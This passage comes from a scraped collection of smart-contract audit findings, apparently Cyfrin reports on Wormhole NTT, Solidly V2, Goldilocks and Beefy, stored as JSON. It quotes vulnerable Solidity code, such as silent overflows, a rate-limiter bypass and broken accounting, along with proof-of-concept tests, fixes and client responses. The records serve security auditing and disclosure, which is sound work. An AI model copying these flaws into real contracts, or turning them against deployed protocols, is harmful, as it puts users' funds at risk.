        "contract TestTransceiverModification is Test, INttManagerEvents, IRateLimiterEvents {\n    NttManager nttManagerChain1;\n    NttManager nttManagerChain2;\n\n    using TrimmedAmountLib for uint256;\n    using TrimmedAmountLib for TrimmedAmount;\n\n    uint16 constant chainId1 = 7;\n    uint16 constant chainId2 = 100;\n    uint8 constant FAST_CONSISTENCY_LEVEL = 200;\n    uint256 constant GAS_LIMIT = 500000;\n\n    uint16 constant SENDING_CHAIN_ID = 1;\n    uint256 constant DEVNET_GUARDIAN_PK =\n        0xcfb12303a19cde580bb4dd771639b0d26bc68353645571a8cff516ab2ee113a0;\n    WormholeSimulator guardian;\n    uint256 initialBlockTimestamp;\n\n    WormholeTransceiver wormholeTransceiverChain1;\n    WormholeTransceiver wormholeTransceiver2Chain1;\n    WormholeTransceiver wormholeTransceiver3Chain1;\n\n    WormholeTransceiver wormholeTransceiverChain2;\n    address userA = address(0x123);\n    address userB = address(0x456);\n    address userC = address(0x789);\n    address userD = address(0xABC);\n\n    address relayer = address(0x28D8F1Be96f97C1387e94A53e00eCcFb4E75175a);\n    IWormhole wormhole = IWormhole(0x706abc4E45D419950511e474C7B9Ed348A4a716c);\n\n    function setUp() public {\n        string memory url = \"https://goerli.blockpi.network/v1/rpc/public\";\n        vm.createSelectFork(url);\n        initialBlockTimestamp = vm.getBlockTimestamp();\n\n        guardian = new WormholeSimulator(address(wormhole), DEVNET_GUARDIAN_PK);\n\n        vm.chainId(chainId1);\n        DummyToken t1 = new DummyToken();\n        NttManager implementation =\n            new MockNttManagerContract(address(t1), INttManager.Mode.LOCKING, chainId1, 1 days);\n\n        nttManagerChain1 =\n            MockNttManagerContract(address(new ERC1967Proxy(address(implementation), \"\")));\n        nttManagerChain1.initialize();\n\n        // transceiver 1\n        WormholeTransceiver wormholeTransceiverChain1Implementation = new MockWormholeTransceiverContract(\n            address(nttManagerChain1),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n        wormholeTransceiverChain1 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation), \"\"))\n        );\n\n        // transceiver 2\n        WormholeTransceiver wormholeTransceiverChain1Implementation2 = new MockWormholeTransceiverContract(\n            address(nttManagerChain1),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n        wormholeTransceiver2Chain1 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation2), \"\"))\n        );\n\n        // transceiver 3\n        WormholeTransceiver wormholeTransceiverChain1Implementation3 = new MockWormholeTransceiverContract(\n            address(nttManagerChain1),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n        wormholeTransceiver3Chain1 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation3), \"\"))\n        );\n\n\n        // Actually initialize properly now\n        wormholeTransceiverChain1.initialize();\n        wormholeTransceiver2Chain1.initialize();\n        wormholeTransceiver3Chain1.initialize();\n\n\n        nttManagerChain1.setTransceiver(address(wormholeTransceiverChain1));\n        nttManagerChain1.setTransceiver(address(wormholeTransceiver2Chain1));\n\n        // third transceiver is NOT set at this point for nttManagerChain1\n        nttManagerChain1.setOutboundLimit(type(uint64).max);\n        nttManagerChain1.setInboundLimit(type(uint64).max, chainId2);\n\n        // Chain 2 setup\n        vm.chainId(chainId2);\n        DummyToken t2 = new DummyTokenMintAndBurn();\n        NttManager implementationChain2 =\n            new MockNttManagerContract(address(t2), INttManager.Mode.BURNING, chainId2, 1 days);\n\n        nttManagerChain2 =\n            MockNttManagerContract(address(new ERC1967Proxy(address(implementationChain2), \"\")));\n        nttManagerChain2.initialize();\n\n        WormholeTransceiver wormholeTransceiverChain2Implementation = new MockWormholeTransceiverContract(\n            address(nttManagerChain2),\n            address(wormhole),\n            address(relayer),\n            address(0x0),\n            FAST_CONSISTENCY_LEVEL,\n            GAS_LIMIT\n        );\n\n        wormholeTransceiverChain2 = MockWormholeTransceiverContract(\n            address(new ERC1967Proxy(address(wormholeTransceiverChain2Implementation), \"\"))\n        );\n        wormholeTransceiverChain2.initialize();\n\n        nttManagerChain2.setTransceiver(address(wormholeTransceiverChain2));\n        nttManagerChain2.setOutboundLimit(type(uint64).max);\n        nttManagerChain2.setInboundLimit(type(uint64).max, chainId1);\n\n        // Register peer contracts for the nttManager and transceiver. Transceivers and nttManager each have the concept of peers here.\n        nttManagerChain1.setPeer(chainId2, bytes32(uint256(uint160(address(nttManagerChain2)))), 9);\n        nttManagerChain2.setPeer(chainId1, bytes32(uint256(uint160(address(nttManagerChain1)))), 7);\n\n        // Set peers for the transceivers\n        wormholeTransceiverChain1.setWormholePeer(\n            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))\n        );\n\n       wormholeTransceiver2Chain1.setWormholePeer(\n            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))\n        );\n\n       wormholeTransceiver3Chain1.setWormholePeer(\n            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))\n        );\n\n\n        wormholeTransceiverChain2.setWormholePeer(\n            chainId1, bytes32(uint256(uint160(address(wormholeTransceiverChain1))))\n        );\n\n\n        require(nttManagerChain1.getThreshold() != 0, \"Threshold is zero with active transceivers\");\n\n        // Actually set it\n        nttManagerChain1.setThreshold(2);\n        nttManagerChain2.setThreshold(1);\n    }\n\n    function testTransceiverModification() external {\n        vm.chainId(chainId1);\n\n        // Setting up the transfer\n        DummyToken token1 = DummyToken(nttManagerChain1.token());\n        uint8 decimals = token1.decimals();\n\n        token1.mintDummy(address(userA), 5 * 10 ** decimals);\n        uint256 outboundLimit = 4 * 10 ** decimals;\n        nttManagerChain1.setOutboundLimit(outboundLimit);\n\n        vm.startPrank(userA);\n\n        uint256 transferAmount = 5 * 10 ** decimals;\n        token1.approve(address(nttManagerChain1), transferAmount);\n\n        // transfer with shouldQueue == true\n        uint64 qSeq = nttManagerChain1.transfer(\n            transferAmount, chainId2, toWormholeFormat(userB), true, encodeTransceiverInstructions(true)\n        );\n        vm.stopPrank();\n\n        assertEq(qSeq, 0);\n        IRateLimiter.OutboundQueuedTransfer memory qt = nttManagerChain1.getOutboundQueuedTransfer(0);\n        assertEq(qt.amount.getAmount(), transferAmount.trim(decimals, decimals).getAmount());\n        assertEq(qt.recipientChain, chainId2);\n        assertEq(qt.recipient, toWormholeFormat(userB));\n        assertEq(qt.txTimestamp, initialBlockTimestamp);\n\n        // assert that the contract also locked funds from the user\n        assertEq(token1.balanceOf(address(userA)), 0);\n        assertEq(token1.balanceOf(address(nttManagerChain1)), transferAmount);\n\n\n        // elapse some random time - 60 seconds\n        uint256 durationElapsedTime = initialBlockTimestamp + 60;\n\n        // now add a third transceiver\n        nttManagerChain1.setTransceiver(address(wormholeTransceiver3Chain1));\n\n        // verify that the third transceiver is added\n        assertEq(nttManagerChain1.getTransceivers().length, 3);\n\n        // remove second transceiver\n        nttManagerChain1.removeTransceiver(address(wormholeTransceiver2Chain1));\n\n          // verify that the second transceiver is removed\n        assertEq(nttManagerChain1.getTransceivers().length, 2);\n\n         // elapse rate limit duration\n         durationElapsedTime = initialBlockTimestamp + nttManagerChain1.rateLimitDuration();\n\n        vm.warp(durationElapsedTime);\n\n        vm.expectRevert(stdError.indexOOBError); //index out of bounds - transceiver instructions array does not have a third element to access\n        nttManagerChain1.completeOutboundQueuedTransfer(0);\n    }\n\n    // Encode an instruction for each of the relayers\n  function encodeTransceiverInstructions(bool relayer_off) public view returns (bytes memory) {\n        WormholeTransceiver.WormholeTransceiverInstruction memory instruction =\n            IWormholeTransceiver.WormholeTransceiverInstruction(relayer_off);\n\n        bytes memory encodedInstructionWormhole =\n            wormholeTransceiverChain1.encodeWormholeTransceiverInstruction(instruction);\n\n        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction1 =\n        TransceiverStructs.TransceiverInstruction({index: 0, payload: encodedInstructionWormhole});\n        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction2 =\n        TransceiverStructs.TransceiverInstruction({index: 1, payload: encodedInstructionWormhole});\n\n        TransceiverStructs.TransceiverInstruction[] memory TransceiverInstructions =\n            new TransceiverStructs.TransceiverInstruction[](2);\n\n        TransceiverInstructions[0] = TransceiverInstruction1;\n        TransceiverInstructions[1] = TransceiverInstruction2;\n\n        return TransceiverStructs.encodeTransceiverInstructions(TransceiverInstructions);\n    }\n}\n"
    ],
    "Description": [
        " When a sender transfers an amount that exceeds the current outbound capacity, such transfers are sent to a queue for delayed execution within NttManager::_transferEntrypoint. The rate limit duration is defined as an immutable variable determining the temporal lag between queueing and execution, with a typical rate limit duration being 24 hours.",
        "In the event that new Transceivers are added or existing Transceivers are removed from the NTT Manager, any pending queued transfers within the rate limit duration can potentially revert. This is because senders might not have correctly packed the Transceiver instructions for a given Transceiver based on the new configuration, and a missing Transceiver instruction can potentially cause an array index out-of-bounds exception while calculating the delivery price when the instructions are finally parsed. For example, if there are initially two Transceivers but an additional Transceiver is added while the transfer is rate-limited, the instructions array as shown below will be declared with a length of three, corresponding to the new number of enabled Transceivers; however, the transfer will have only encoded two Transceiver instructions based on the configuration at the time it was initiated."
    ],
    "Impact": [
        " Missing Transceiver instructions prevents the total delivery price for the corresponding message from being calculated. This prevents any queued Transfers from being executed with the current list of transceivers. As a result, underlying sender funds will be stuck in the NttManager contract. Note that a similar issue occurs if the peer NTT manager contract is updated on the destination (say, after a redeployment on the source chain) before an in-flight attestation is received and executed, reverting with an invalid peer error."
    ],
    "Proof of Concept": [
        " Run the following test:"
    ],
    "Recommended Mitigation": [
        " Consider passing no instructions into the delivery price estimation when the Transceiver index does not exist."
    ],
    "Wormhole Foundation": [
        " Fixed in PR #360."
    ],
    "Cyfrin": [
        " Verified. The instructions array is now allocated using the number of registered Transceivers rather than the number of enabled Transceivers, fixing the case where Transceivers are enabled/disabled. This also fixes the case where new Transceivers are registered. Since the loop is over the parsed instructions length, those for any newly registered Transceivers will remain the default value (this logic also applies to the standard transfer call).",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/silent-overflow-in-trimmedamountshift-could-result-in-rate-limiter-being-bypassed-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "// NOTE: amt after trimming must fit into uint64 (that's the point of\n// trimming, as Solana only supports uint64 for token amts)\nif (amountScaled > type(uint64).max) {\n    revert AmountTooLarge(amt);\n}\n",
        "function shift(\n    TrimmedAmount memory amount,\n    uint8 toDecimals\n) internal pure returns (TrimmedAmount memory) {\n    uint8 actualToDecimals = minUint8(TRIMMED_DECIMALS, toDecimals);\n    return TrimmedAmount(\n        uint64(scale(amount.amount, amount.decimals, actualToDecimals)), actualToDecimals\n    );\n}\n"
    ],
    "Description": [
        " Within TrimmedAmount::trim, there is an explicit check that ensures the scaled amount does not exceed the maximum uint64:",
        "However, no such check exists within TrimmedAmount::shift which means there is potential for silent overflow when casting to uint64 here:"
    ],
    "Impact": [
        " A silent overflow in TrimmedAmount::shift could result in the rate limiter being bypassed, considering its usage in NttManager::_transferEntryPoint. Given the high impact and reasonable likelihood of this issue occurring, it is classified a MEDIUM severity finding."
    ],
    "Recommended Mitigation": [
        " Explicitly check the scaled amount in TrimmedAmount::shift does not exceed the maximum uint64."
    ],
    "Wormhole Foundation": [
        " Fixed in PR #262."
    ],
    "Cyfrin": [
        " Verified. OpenZeppelin SafeCast library is now used when casting to uint64."
    ]
}
----End JSON----

https://solodit.xyz/issues/disabled-transceivers-cannot-be-re-enabled-by-calling-transceiverregistry_settransceiver-after-64-have-been-registered-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function _setTransceiver(address transceiver) internal returns (uint8 index) {\n    /* snip */\n    if (transceiver == address(0)) {\n        revert InvalidTransceiverZeroAddress();\n    }\n\n    if (_numTransceivers.registered >= MAX_TRANSCEIVERS) {\n        revert TooManyTransceivers();\n    }\n\n    if (transceiverInfos[transceiver].registered) {\n        transceiverInfos[transceiver].enabled = true;\n    } else {\n    /* snip */\n}\n"
    ],
    "Description": [
        " TransceiverRegistry::_setTransceiver handles the registering of Transceivers, but note that they cannot be re-registered as this has other downstream effects, so this function is also responsible for the re-enabling of previously registered but currently disabled Transceivers.",
        "This function reverts if the passed transceiver address is address(0) or the number of registered transceivers is already at its defined maximum of 64. Assuming a total of 64 registered Transceivers, with some of these Transceivers having been previously disabled, the placement of this latter validation will prevent a disabled Transceiver from being re-enabled since the subsequent block in which the storage indicating its enabled state is set to true is not reachable. Consequently, it will not be possible to re-enable any disabled transceivers after having registered the maximum number of Transceivers, meaning that this function will never be callable without redeployment."
    ],
    "Impact": [
        " Under normal circumstances, this maximum number of registered Transceivers should never be reached, especially since the underlying Transceivers are upgradeable. However, while unlikely based on operational assumptions, this undefined behavior could have a high impact, and so this is classified as a MEDIUM severity finding."
    ],
    "Recommended Mitigation": [
        " Move the placement of the maximum Transceivers validation to within the else block that is responsible for handling the registration of new Transceivers."
    ],
    "Wormhole Foundation": [
        " Fixed in PR #253."
    ],
    "Cyfrin": [
        " Verified. The validation is now skipped for previously registered (but currently disabled) Transceivers."
    ]
}
----End JSON----

https://solodit.xyz/issues/ntt-manager-cannot-be-unpaused-once-paused-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function pause() public onlyOwnerOrPauser {\n    _pause();\n}\n"
    ],
    "Description": [
        " NttManagerState::pause exposes pause functionality to be triggered by permissioned actors but has no corresponding unpause functionality. As such, once the NTT Manager is paused, it will not be possible to unpause without a contract upgrade."
    ],
    "Impact": [
        " The inability to unpause the NTT Manager could result in significant disruption, requiring either a contract upgrade or complete redeployment to resolve this issue."
    ],
    "Recommended Mitigation": [
        ""
    ],
    "Wormhole Foundation": [
        " Fixed in PR #273."
    ],
    "Cyfrin": [
        " Verified. A corresponding unpause function has been added."
    ]
}
----End JSON----

https://solodit.xyz/issues/immutable-gas-limit-within-wormholetransceiver-can-lead-to-execution-failures-on-the-target-chain-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " The Wormhole-specific Transceiver implementation uses an immutable gasLimit variable to calculate the Relayer delivery price. The underlying assumption here is that the gas consumed for transfers will always be static; however, this is not always the case, especially for L2 rollups such as Arbitrum, where gas is calculated as a function of the actual gas consumed on L2 and the L1 calldata cost that is effectively an L2 view of the L1 gas price. Please refer to the Arbitrum docs for more information on how gas is estimated.",
        "In cases where L2 gas depends on the L1 gas price, extreme scenarios can occur where the delivery cost computed by the static gas limit is insufficient to execute a transfer on L2."
    ],
    "Impact": [
        " An immutable gas limit can give an extremely stale view of the L2 gas needed to execute a transfer. In extreme scenarios, such stale gas estimates can be insufficient to execute messages on a target chain. If such a scenario occurs, all pending messages with a stale gas estimate will risk being stuck on the target chain. While the gas limit can be changed via an upgrade, there are two issues with this approach:"
    ],
    "Recommended Mitigation": [
        " Consider making the gas limit mutable. If necessary, NTT Managers can keep track of L1 gas prices and change the gas limits accordingly."
    ],
    "Wormhole Foundation": [
        " This failure case can be handled by requesting redelivery with a higher gas limit. The current logic is the same as we use in our automatic relayers and we are ok with the current limitations of this design."
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/transceiver-invariants-and-ownership-synchronicity-can-be-broken-by-unsafe-transceiver-upgrades-cyfrin-none-cyfrin-wormhole-evm-ntt-v2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "function _initialize() internal virtual override {\n    // check if the owner is the deployer of this contract\n    if (msg.sender != deployer) {\n        revert UnexpectedDeployer(deployer, msg.sender);\n    }\n\n    __ReentrancyGuard_init();\n    // owner of the transceiver is set to the owner of the nttManager\n    __PausedOwnable_init(msg.sender, getNttManagerOwner());\n}\n",
        "/// @dev transfer the ownership of the transceiver to a new address\n/// the nttManager should be able to update transceiver ownership.\nfunction transferTransceiverOwnership(address newOwner) external onlyNttManager {\n    _transferOwnership(newOwner);\n}\n",
        "/// @notice Transfer ownership of the Manager contract and all Endpoint contracts to a new owner.\nfunction transferOwnership(address newOwner) public override onlyOwner {\n    super.transferOwnership(newOwner);\n    // loop through all the registered transceivers and set the new owner of each transceiver to the newOwner\n    address[] storage _registeredTransceivers = _getRegisteredTransceiversStorage();\n    _checkRegisteredTransceiversInvariants();\n\n    for (uint256 i = 0; i < _registeredTransceivers.length; i++) {\n        ITransceiver(_registeredTransceivers[i]).transferTransceiverOwnership(newOwner);\n    }\n}\n",
        "function test_immutableUpgradePoC() public {\n    // create the new mock ntt manager contract\n    NttManager newImpl = new MockNttManagerContract(\n        nttManagerChain1.token(), IManagerBase.Mode.BURNING, chainId1, 1 days, false\n    );\n    MockNttManagerContract newNttManager =\n        MockNttManagerContract(address(new ERC1967Proxy(address(newImpl), \"\")));\n    newNttManager.initialize();\n\n    // transfer transceiver ownership\n    wormholeTransceiverChain1.transferOwnership(makeAddr(\"new transceiver owner\"));\n\n    // create the new transceiver implementation, specifying the new ntt manager\n    WormholeTransceiver wormholeTransceiverChain1Implementation = new MockWormholeTransceiverImmutableAllow(\n        address(newNttManager),\n        address(wormhole),\n        address(relayer),\n        address(0x0),\n        FAST_CONSISTENCY_LEVEL,\n        GAS_LIMIT\n    );\n\n    // perform the transceiver upgrade\n    wormholeTransceiverChain1.upgrade(address(wormholeTransceiverChain1Implementation));\n\n    // ntt manager ownership transfer should fail and revert\n    vm.expectRevert(abi.encodeWithSelector(ITransceiver.CallerNotNttManager.selector, address(this)));\n    nttManagerChain1.transferOwnership(makeAddr(\"new ntt manager owner\"));\n}\n"
    ],
    "Description": [
        " Transceivers are upgradeable contracts integral to the cross-chain message handling of NTT tokens. While WormholeTransceiver is a specific implementation of the Transceiver contract, NTT Managers can integrate with Transceivers of any custom implementation.",
        "Transceiver::_checkImmutables is an internal virtual function that verifies that invariants are not violated during an upgrade. Two checks in this function are that a) the NTT Manager address remains the same and b) the underlying NTT token address remains the same.",
        "However, the current logic allows integrators to bypass these checks by either:",
        "Based on the understanding that Transceivers are deployed by integrators external to NTT Manager owners, regardless of the high trust assumptions associated with integrators, it is risky for NTT Managers to delegate power to Transceivers to silently upgrade a transceiver contract that can potentially violate the NTT Manager invariants.",
        "One example of this involves the intended ownership model. Within Transceiver::_initialize, the owner of the Transceiver is set to the owner of the NttManager contract:",
        "However, the transferring of this ownership via Transceiver::transferTransceiverOwnership is only allowed by the NTT Manager itself:",
        "When the owner of the NTT Manager is changed by calling NttManagerState::transferOwnership, the owner of all the Transceivers is changed with it:",
        "This design is intended to ensure that the NTT Manager's owner is kept in sync across all transceivers, access-controlled to prevent unauthorized ownership changes, but transceiver ownership can still be transferred directly as the public OwnableUpgradeable::transferOwnership function has not been overridden. Even if Transceiver ownership changes, the Manager is permitted to change it again via the above function.",
        "However, this behavior can be broken if the new owner of a Transceiver performs a contract upgrade without the immutables check. In this way, they can change the NTT Manager, preventing the correct manager from having permissions as expected. As a result, NttManagerState::transferOwnership will revert if any one Transceiver is out of sync with the others, and since it is not possible to remove an already registered transceiver, this function will cease to be useful. Instead, each Transceiver will be forced to be manually updated to the new owner unless the modified Transceiver is reset back to the previous owner so that this function can be called again."
    ],
    "Impact": [
        " While this issue may require the owner of a Transceiver to misbehave, a scenario where a Transceiver is silently upgraded with a new NTT Manager or NTT Manager token can be problematic for cross-chain transfers and so is prescient to note."
    ],
    "Proof of Concept": [
        " The below PoC calls the _setMigratesImmutables() function with the true boolean, effectively bypassing the _checkImmutables() invariant check. As a result, a subsequent call to NttManagerState::transferOwnership is demonstrated to revert. This test should be added to the contract in Upgrades.t.sol before running, and the revert in MockWormholeTransceiverContract::transferOwnership should be removed to reflect the true functionality."
    ],
    "Recommended Mitigation": [
        " Consider making Transceiver::_checkImmutables and Implementation::_setMigratesImmutables private functions for Transceivers. If the _checkImmutables() function has to be overridden, consider exposing another function that is called inside _checkImmutables as follows:"
    ],
    "Wormhole Foundation": [
        " The manager is a trusted entity and will not deliberately break their own upgrades. The manager has the ability to set the owner for any transceiver, although most NTT deployments will likely share the same owner across all supported transceivers"
    ],
    "Cyfrin": [
        " Acknowledged."
    ]
}
----End JSON----

https://solodit.xyz/issues/locks-can-be-created-with-expiry-in-the-past-cyfrin-none-cyfrin-solidly-v2-memecore-v2-2-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "it(\"lock can be created in the past\", async function () {\n  const { user1, test0, test1, router, pair } = await loadFixture(deploySolidlyV2Fixture);\n\n  let token0 = test0;\n  let token1 = test1;\n\n  // Approve tokens for liquidity provision\n  await token0.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n  await token1.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n\n  // Provide liquidity\n  await router.connect(user1).addLiquidity(\n    token0.address,\n    token1.address,\n    ethers.utils.parseUnits(\"100\", 18),\n    ethers.utils.parseUnits(\"100\", 18),\n    0,\n    0,\n    user1.address,\n    ethers.constants.MaxUint256\n  );\n\n  const liquidityBalance = await pair.balanceOf(user1.address);\n\n  let blockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;\n\n  let maxUint128 = ethers.BigNumber.from(\"340282366920938463463374607431768211455\");\n\n  // Lock LP tokens\n  await pair.connect(user1).lockToken(user1.address, liquidityBalance, maxUint128.sub(blockTimestamp));\n\n\n  let ret = await pair.getLock(user1.address, 0);\n  expect(ret.date).to.be.eq(0);\n});\n"
    ],
    "Description": [
        " Due to a silent overflow in SolidityV2ERC42069::lockToken, a sufficiently large duration will cause the unlock date to be in the past. This could allow the caller to create a fraudulent lock, advertising that they have locked for the maximum duration but which can actually be withdrawn immediately. However, the impact is somewhat limited as this will be visible to anyone who calls SolidityV2ERC42069::getLock(s) with the owner's address (perhaps in a UI). From the attacker's perspective, the extension functionality could ideally be used to wrap around at will, hiding this malicious intent; however, this is not possible due to the checked math revert when incrementing the date."
    ],
    "Impact": [
        " This bug has a high likelihood of being abused with a more limited impact; therefore, it is categorized as a medium-severity finding."
    ],
    "Proof of Concept": [
        " Append this test to MultiTest.js:"
    ],
    "Recommended Mitigation": [
        " Cast the timestamp to uint128 prior to performing the addition rather than unsafely downcasting the result of the addition:"
    ],
    "Solidly Labs": [
        " Fixed in commit 14533e7."
    ],
    "Cyfrin": [
        " Verified. The timestamp is first cast to uint128 prior to performing the addition.",
        "\\clearpage"
    ]
}
----End JSON----

https://solodit.xyz/issues/goldilendlock-will-always-revert-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function lock(uint256 amount) external {\n    uint256 mintAmount = _GiBGTMintAmount(amount);\n    poolSize += amount;\n    _refreshiBGT(amount); //@audit should call after depositing funds\n    SafeTransferLib.safeTransferFrom(ibgt, msg.sender, address(this), amount);\n    _mint(msg.sender, mintAmount);\n    emit iBGTLock(msg.sender, amount);\n  }\n...\n  function _refreshiBGT(uint256 ibgtAmount) internal {\n    ERC20(ibgt).approve(ibgtVault, ibgtAmount);\n    iBGTVault(ibgtVault).stake(ibgtAmount); //@audit will revert here\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In lock(), it calls _refreshiBGT() before pulling iBGT from the user and will revert while calling iBGTVault(ibgtVault).stake()."
    ],
    "Impact": [
        " Users can't lock iBGT as lock() always reverts."
    ],
    "Recommended Mitigation": [
        " _refreshiBGT() should be called after pulling funds from the user."
    ],
    "Client": [
        " Fixed in PR #1"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/wrong-poolsize-increment-in-goldilendrepay-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function repay(uint256 repayAmount, uint256 _userLoanId) external {\n    Loan memory userLoan = loans[msg.sender][_userLoanId];\n    if(userLoan.borrowedAmount < repayAmount) revert ExcessiveRepay();\n    if(block.timestamp > userLoan.endDate) revert LoanExpired();\n    uint256 interestLoanRatio = FixedPointMathLib.divWad(userLoan.interest, userLoan.borrowedAmount);\n    uint256 interest = FixedPointMathLib.mulWadUp(repayAmount, interestLoanRatio);\n    outstandingDebt -= repayAmount - interest > outstandingDebt ? outstandingDebt : repayAmount - interest;\n    loans[msg.sender][_userLoanId].borrowedAmount -= repayAmount;\n    loans[msg.sender][_userLoanId].interest -= interest;\n    poolSize += userLoan.interest * (1000 - (multisigShare + apdaoShare)) / 1000; //@audit should use interest instead of userLoan.interest\n...\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " When a user repays his loan using repay(), it increases poolSize with the repaid interest. During the increment, it uses the wrong amount.",
        "It should use interest instead of userLoan.interest because the user repaid interest only."
    ],
    "Impact": [
        " poolSize would be tracked wrongly after calling repay() and several functions wouldn't work as expected."
    ],
    "Recommended Mitigation": [
        " poolSize should be updated using interest."
    ],
    "Client": [
        " Fixed in PR #2"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/users-can-extend-an-expired-boost-using-invalidated-nfts-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function _buildBoost(\n    address[] calldata partnerNFTs,\n    uint256[] calldata partnerNFTIds\n  ) internal returns (Boost memory newUserBoost) {\n    uint256 magnitude;\n    Boost storage userBoost = boosts[msg.sender];\n    if(userBoost.expiry == 0) {\n...\n    }\n    else {\n      address[] storage nfts = userBoost.partnerNFTs;\n      uint256[] storage ids = userBoost.partnerNFTIds;\n      magnitude = userBoost.boostMagnitude; //@audit use old magnitude without checking\n      for (uint256 i = 0; i < partnerNFTs.length; i++) {\n        magnitude += partnerNFTBoosts[partnerNFTs[i]];\n        nfts.push(partnerNFTs[i]);\n        ids.push(partnerNFTIds[i]);\n      }\n      newUserBoost = Boost({\n        partnerNFTs: nfts,\n        partnerNFTIds: ids,\n        expiry: block.timestamp + boostLockDuration,\n        boostMagnitude: magnitude\n      });\n    }\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In Goldilend.sol#L251, a user can extend a boost with invalidated NFTs."
    ],
    "Impact": [
        " Malicious users can use invalidated NFTs to extend their boosts forever."
    ],
    "Recommended Mitigation": [
        " Whenever users extend their boosts, their NFTs should be evaluated again."
    ],
    "Client": [
        " Fixed in PR #3"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/team-members-cant-unstake-the-initial-allocation-forever-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function _vestingCheck(address user, uint256 amount) internal view returns (uint256) {\n    if(teamAllocations[user] > 0) return 0; //@audit return 0 for team members\n    uint256 initialAllocation = seedAllocations[user];\n    if(initialAllocation > 0) {\n      if(block.timestamp < vestingStart) return 0;\n      uint256 vestPortion = FixedPointMathLib.divWad(block.timestamp - vestingStart, vestingEnd - vestingStart);\n      return FixedPointMathLib.mulWad(vestPortion, initialAllocation) - (initialAllocation - stakedLocks[user]);\n    }\n    else {\n      return amount;\n    }\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " When users call unstake(), it calculates the vested amount using _vestingCheck().",
        "But it returns 0 for team members and they can't unstake forever.\nFurthermore, in stake(), it just prevents seed investors, not team members. So if team members have staked additionally, they can't unstake also."
    ],
    "Impact": [
        " Team members can't unstake forever."
    ],
    "Recommended Mitigation": [
        " _vestingCheck should use the same logic as initial investors for team mates."
    ],
    "Client": [
        " Acknowledged, it is intended that the team cannot unstake their tokens. PR #4 fixes issue of stake not preventing team members from staking."
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/in-govlocks-it-shouldnt-use-a-deposits-mapping-cyfrin-none-cyfrin-goldilocks-v11-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [
        "  function deposit(uint256 amount) external {\n    deposits[msg.sender] += amount; //@audit no need\n    _moveDelegates(address(0), delegates[msg.sender], amount);\n    SafeTransferLib.safeTransferFrom(locks, msg.sender, address(this), amount);\n    _mint(msg.sender, amount);\n  }\n\n  /// @notice Withdraws Locks to burn Govlocks\n  /// @param amount Amount of Locks to withdraw\n  function withdraw(uint256 amount) external {\n    deposits[msg.sender] -= amount; //@audit no need\n    _moveDelegates(delegates[msg.sender], address(0), amount);\n    _burn(msg.sender, amount);\n    SafeTransferLib.safeTransfer(locks, msg.sender, amount);\n  }\n"
    ],
    "Severity": [
        " High"
    ],
    "Description": [
        " In GovLocks, it tracks every user's deposit amount using a deposits mapping.\nAs users can transfer govLocks freely, they might have fewer deposits than their govLocks balance and wouldn't be able to withdraw when they want.",
        "Here is a possible scenario."
    ],
    "Impact": [
        " Users wouldn't be able to withdraw LOCKS with govLOCKS."
    ],
    "Recommended Mitigation": [
        " We don't need to use the deposits mapping at all and we can just rely on govLocks balances."
    ],
    "Client": [
        " Fixed in PR #8"
    ],
    "Cyfrin": [
        " Verified."
    ]
}
----End JSON----

https://solodit.xyz/issues/no-slippage-parameter-on-uniswapv3-swaps-can-be-exploited-by-mev-to-return-fewer-output-tokens-cyfrin-none-cyfrin-beefy-finance-markdown
--------------------------------------------------
----Start JSON----
{
    "code": [],
    "Description": [
        " UniV3Utils::swap performs a swap with amountOutMinimum: 0. This function is called by StrategyPassiveManagerUniswap::_chargeFees L375, L389 and BeefyQIVault::_swapRewardsToNative L223."
    ],
    "Impact": [
